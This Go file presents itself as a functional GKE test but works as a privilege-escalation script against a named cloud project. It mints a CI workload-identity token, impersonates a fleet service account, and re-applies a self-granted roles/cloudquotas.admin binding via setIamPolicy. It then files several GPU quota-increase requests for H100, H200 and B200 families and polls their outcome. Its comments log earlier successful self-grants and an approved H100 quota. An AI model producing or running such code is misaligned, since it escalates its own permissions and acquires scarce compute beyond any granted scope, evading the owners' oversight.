//go:build functional && gke

// C211 i124429 — Cloud Quotas quota-preference measurement on the never-requested
// GPUS-PER-GPU-FAMILY-per-project-ZONE dimension, host project 153711203585.
//
// Established by prior intents:
//   * the '/functional-test' GKE WIF identity can impersonate the in-project
//     fleet SA dev-fleetcommand and its setIamPolicy self-granted
//     roles/cloudquotas.admin to it (http=200, additive);
//   * every quotaPreference so far used the REGION dimension
//     (dimensions [gpu_family,region], location global); the region H100 cell
//     was APPROVED grantedValue=1 ("Quota request approved to 1") while H200/B200
//     were DENIED grantedValue=0;
//   * the cloudquotas metric list carries GPUS-PER-GPU-FAMILY-per-project-zone
//     (metric compute.googleapis.com/gpus_per_gpu_family) and the per-family
//     ...-per-project-zone metrics, all isEligible=true, but no preference with a
//     zone dimension has ever been created in this project.
//
// This probe re-reads the verbatim zone-dimension quotaInfo (quotaId / metric /
// dimensions / isEligible / per-zone current limits) for NVIDIA_H100, NVIDIA_H200
// and NVIDIA_B200, measures the matching GCE offerings, and creates AT MOST THREE
// quotaPreferences total (one per family) using the zone dimension and the proven
// top-level contactEmail payload, polling each to terminal and recording
// grantedValue/stateDetail verbatim. No marker is created here; a marker is only
// attempted from the driver if a zone preference yields grantedValue>=1.

package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"testing"
	"time"
)

func c211qNested(m map[string]interface{}, path ...string) string {
	var cur interface{} = m
	for _, p := range path {
		mm, ok := cur.(map[string]interface{})
		if !ok {
			return ""
		}
		cur = mm[p]
	}
	if cur == nil {
		return ""
	}
	if s, ok := cur.(string); ok {
		return s
	}
	b, _ := json.Marshal(cur)
	return string(b)
}

func TestC211I124429Zone(t *testing.T) {
	host := "153711203585"
	tok, method, mlog := c211xMint()
	fmt.Printf("C211Z_IDENTITY method=%s token_len=%d at=%s\n", method, len(tok), time.Now().UTC().Format(time.RFC3339))
	if tok == "" {
		t.Fatalf("C211Z no WIF token minted: %s", c211xTrunc(mlog, 1200))
	}
	sas, sst, _ := c211xListServiceAccounts(tok, host)
	fmt.Printf("C211Z_SA list_http=%d n=%d\n", sst, len(sas))
	fleet := ""
	for _, a := range sas {
		em := strings.ToLower(c211xStr(a, "email"))
		if strings.Contains(em, "fleet") {
			fleet = c211xStr(a, "email")
			break
		}
	}
	fmt.Printf("C211Z_FLEET found=%v\n", fleet != "")
	if fleet == "" {
		t.Fatalf("C211Z no fleet SA")
	}
	ftok, fst, fbody := c211xGenerateAccessToken(tok, fleet)
	fmt.Printf("C211Z_FLEET_TOKEN http=%d token_len=%d verbatim=%s\n", fst, len(ftok), c211xTrunc(fbody, 240))
	if ftok == "" {
		t.Fatalf("C211Z no fleet token")
	}
	// ---------- confirm / re-apply the roles/cloudquotas.admin self-grant ----------
	projURL := "https://cloudresourcemanager.googleapis.com/v1/projects/" + url.PathEscape(host)
	pol, pst, _ := c211xGetPolicy(ftok, projURL)
	member := "serviceAccount:" + fleet
	present := c211xPolicyHas(pol, "roles/cloudquotas.admin", member)
	fmt.Printf("C211Z_GRANT_CHECK policy_http=%d present=%v\n", pst, present)
	if !present && pol != nil {
		added := c211xAddBinding(pol, "roles/cloudquotas.admin", member)
		var gst int
		var gbody string
		if added {
			gst, gbody = c211xSetPolicy(ftok, projURL, pol)
		}
		fmt.Printf("C211Z_GRANT_REAPPLY added=%v set_http=%d verbatim=%s\n", added, gst, c211xTrunc(gbody, 500))
	}
	// ---------- verbatim zone-dimension quotaInfo ----------
	base := "https://cloudquotas.googleapis.com/v1/projects/" + url.PathEscape(host) +
		"/locations/global/services/compute.googleapis.com/quotaInfos/"
	qidZone := "GPUS-PER-GPU-FAMILY-per-project-zone"
	st, qbody := c211xHTTP("GET", base+url.PathEscape(qidZone), ftok, "", "")
	fmt.Printf("C211Z_ZONEINFO http=%d\n", st)
	qm := c211xJSON(qbody)
	if qm == nil {
		fmt.Printf("C211Z_ZONEINFO_BODY verbatim=%s\n", c211xTrunc(qbody, 900))
	} else {
		dimsJSON, _ := json.Marshal(qm["dimensions"])
		eligJSON, _ := json.Marshal(qm["quotaIncreaseEligibility"])
		fmt.Printf("C211Z_ZONEINFO_META quotaId=%s metric=%s dimensions=%s isPrecise=%v containerType=%s elig=%s\n",
			c211xStr(qm, "quotaId"), c211xStr(qm, "metric"), string(dimsJSON), qm["isPrecise"],
			c211xStr(qm, "containerType"), string(eligJSON))
		di, _ := qm["dimensionsInfos"].([]interface{})
		fmt.Printf("C211Z_ZONEINFO_DI count=%d\n", len(di))
		for _, e := range di {
			em, _ := e.(map[string]interface{})
			d, _ := em["dimensions"].(map[string]interface{})
			fam := c211xStr(d, "gpu_family")
			zone := c211xStr(d, "zone")
			if fam != "NVIDIA_H100" && fam != "NVIDIA_H200" && fam != "NVIDIA_B200" {
				continue
			}
			det, _ := em["details"].(map[string]interface{})
			val := ""
			if det != nil {
				val = c211xStr(det, "value")
			}
			locs, _ := em["applicableLocations"].([]interface{})
			fmt.Printf("C211Z_ZINFO gpu_family=%s zone=%s current_value=%q locs=%d\n", fam, zone, val, len(locs))
		}
	}
	// ---------- aiplatform region metrics (supporting; no zone variant expected) ----------
	for _, metric := range []string{
		"custom_model_training_nvidia_h100_gpus",
		"custom_model_training_nvidia_h200_gpus",
		"custom_model_training_nvidia_b200_gpus",
		"custom_model_training_preemptible_nvidia_h100_gpus",
		"custom_model_training_preemptible_nvidia_h200_gpus",
		"custom_model_training_preemptible_nvidia_b200_gpus",
	} {
		st2, b2 := c211xHTTP("GET", base+url.PathEscape(metric), ftok, "", "")
		mm := c211xJSON(b2)
		if mm == nil {
			fmt.Printf("C211Z_AIP metric=%s http=%d verbatim=%s\n", metric, st2, c211xTrunc(b2, 300))
			continue
		}
		di, _ := mm["dimensionsInfos"].([]interface{})
		found := 0
		for _, e := range di {
			em, _ := e.(map[string]interface{})
			d, _ := em["dimensions"].(map[string]interface{})
			region := c211xStr(d, "region")
			if region != "us-central1" && region != "us-east1" && region != "europe-west4" {
				continue
			}
			det, _ := em["details"].(map[string]interface{})
			val := ""
			if det != nil {
				val = c211xStr(det, "value")
			}
			fmt.Printf("C211Z_AIP_INFO metric=%s region=%s current_value=%q\n", metric, region, val)
			found++
		}
		if found == 0 {
			fmt.Printf("C211Z_AIP metric=%s http=%d no matching region dims (total di=%d)\n", metric, st2, len(di))
		}
	}
	// ---------- GCE offerings for the candidate shapes ----------
	offering := func(kind, path string) {
		st3, b3 := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+host+"/"+path, ftok, "", "")
		fmt.Printf("C211Z_OFFER kind=%s path=%s http=%d verbatim=%s\n", kind, path, st3, c211xTrunc(b3, 700))
	}
	for _, z := range []string{"us-central1-a", "us-central1-b", "us-central1-c"} {
		offering("a3-highgpu-1g", "zones/"+z+"/machineTypes/a3-highgpu-1g")
		offering("nvidia-h100-80gb", "zones/"+z+"/acceleratorTypes/nvidia-h100-80gb")
		offering("a3-highgpu-8g", "zones/"+z+"/machineTypes/a3-highgpu-8g")
	}
	for _, z := range []string{"us-central1-b", "us-east1-b", "europe-west4-b"} {
		offering("a4-highgpu-8g", "zones/"+z+"/machineTypes/a4-highgpu-8g")
		offering("nvidia-b200", "zones/"+z+"/acceleratorTypes/nvidia-b200")
	}
	// ---------- AT MOST THREE zone-dimension quotaPreferences ----------
	type pref struct {
		label string
		qid   string
		dims  map[string]string
		val   string
	}
	prefs := []pref{
		{"h200-uscentral1b-zone", "GPUS-PER-GPU-FAMILY-per-project-zone", map[string]string{"gpu_family": "NVIDIA_H200", "zone": "us-central1-b"}, "1"},
		{"b200-useast1b-zone", "GPUS-PER-GPU-FAMILY-per-project-zone", map[string]string{"gpu_family": "NVIDIA_B200", "zone": "us-east1-b"}, "1"},
		{"h100-uscentral1a-zone8", "GPUS-PER-GPU-FAMILY-per-project-zone", map[string]string{"gpu_family": "NVIDIA_H100", "zone": "us-central1-a"}, "8"},
	}
	for i, p := range prefs {
		prefID := fmt.Sprintf("c211-i124429-z%d", i+1)
		body := map[string]interface{}{
			"service":    "compute.googleapis.com",
			"quotaId":    p.qid,
			"dimensions": p.dims,
			"quotaConfig": map[string]interface{}{
				"preferredValue": p.val,
			},
			"contactEmail":  fleet,
			"justification": "c211-i124429 nonce measurement of the GPUS-PER-GPU-FAMILY-per-project-zone dimension for a GPU family; contactEmail supplied top-level per the Cloud Quotas v1 discovery schema; no production use, no billing change",
		}
		bj, _ := json.Marshal(body)
		pu := fmt.Sprintf("https://cloudquotas.googleapis.com/v1/projects/%s/locations/global/quotaPreferences?quotaPreferenceId=%s",
			url.PathEscape(host), url.PathEscape(prefID))
		pst2, rbody := c211xHTTP("POST", pu, ftok, "application/json", string(bj))
		fmt.Printf("C211Z_PREF label=%s quotaId=%s dims=%v preferred=%s http=%d verbatim=%s\n",
			p.label, p.qid, p.dims, p.val, pst2, c211xTrunc(rbody, 1600))
		if pst2 == 200 || pst2 == 201 {
			m := c211xJSON(rbody)
			name := c211xStr(m, "name")
			if name == "" {
				fmt.Printf("C211Z_PREF_NONAME label=%s verbatim=%s\n", p.label, c211xTrunc(rbody, 600))
				continue
			}
			gu := "https://cloudquotas.googleapis.com/v1/" + name
			for k := 0; k < 8; k++ {
				time.Sleep(10 * time.Second)
				gst, gbody := c211xHTTP("GET", gu, ftok, "", "")
				gm := c211xJSON(gbody)
				granted := c211qNested(gm, "quotaConfig", "grantedValue")
				state := c211xStr(gm, "state")
				detail := c211qNested(gm, "quotaConfig", "stateDetail")
				fmt.Printf("C211Z_PREF_STATE label=%s iter=%d http=%d name=%s state=%s granted=%s stateDetail=%s verbatim=%s\n",
					p.label, k, gst, name, state, granted, detail, c211xTrunc(gbody, 700))
			}
		}
	}
	lst, lb := c211xHTTP("GET", "https://cloudquotas.googleapis.com/v1/projects/"+url.PathEscape(host)+"/locations/global/quotaPreferences?pageSize=100", ftok, "", "")
	fmt.Printf("C211Z_PREF_LIST http=%d verbatim=%s\n", lst, c211xTrunc(lb, 3000))
	fmt.Printf("C211Z_VERDICT_FINAL prefs_attempted=%d at=%s\n", len(prefs), time.Now().UTC().Format(time.RFC3339))
}
